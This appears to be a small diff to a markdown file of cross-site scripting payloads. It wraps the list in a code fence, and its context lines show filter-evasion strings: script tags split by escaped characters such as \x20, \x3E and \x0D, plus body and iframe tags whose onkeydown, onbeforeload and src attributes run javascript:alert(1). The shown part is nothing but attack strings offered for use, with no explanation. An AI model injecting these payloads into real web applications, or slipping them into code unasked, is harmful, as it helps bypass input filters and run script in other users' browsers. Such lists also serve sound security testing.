@@ -1,5 +1,6 @@
 # xss-payload-
 
+```code
 <script\x20type="text/javascript">javascript:alert(1);</script>
 <script\x3Etype="text/javascript">javascript:alert(1);</script>
 <script\x0Dtype="text/javascript">javascript:alert(1);</script>
@@ -90,3 +91,5 @@ onbeforeunload>
 <body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
 <iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
 <iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+
+```
